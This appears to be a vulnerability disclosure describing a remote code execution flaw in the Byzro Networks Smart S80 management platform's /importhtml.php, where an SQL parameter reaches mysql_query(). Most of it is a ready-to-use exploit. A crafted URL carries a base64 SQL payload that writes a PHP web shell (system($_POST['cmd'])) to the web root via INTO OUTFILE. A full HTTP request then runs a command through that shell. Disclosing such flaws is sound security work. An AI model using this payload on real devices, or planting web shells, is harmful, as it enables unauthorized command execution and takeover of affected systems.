Byzro Networks Smart S80 management platform has rce vulnerability

version:s80

Vulnerability location:/importhtml.php

Code analysis

The sql parameters in the code are controllable and brought into the exportHtmlWebSend() function.

![image](https://github.com/scausoft/cve/assets/40783968/854df332-fb4a-47e4-97e2-4de5d1e1eae1)

In this function, the sql statement is directly brought into mysql_query() for execution. We can write any file into the file through intooutfile, causing an rce vulnerability.

![image](https://github.com/scausoft/cve/assets/40783968/f087540e-9acc-4a32-85f3-38903fb9fae2)

1. The login interface is as shown in the figure.

![image](https://github.com/scausoft/cve/assets/40783968/7f58eca3-4bd0-4522-a8da-7131fef04ad6)

2. Construct the url, write the comment.php file, construct the poc, and successfully execute the command

https://ip:port/importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvY29ubW1lbnQucGhwJw==

POC
```
POST /app/conmment.php HTTP/1.1
Host: ip:port
Cookie: PHPSESSID=3401b9ae729bf679ce88b63174194ff4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 1.1.1.1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

cmd=id
```
![image](https://github.com/scausoft/cve/assets/40783968/57f77885-51e4-4f25-8fce-f1558d90b1bc)
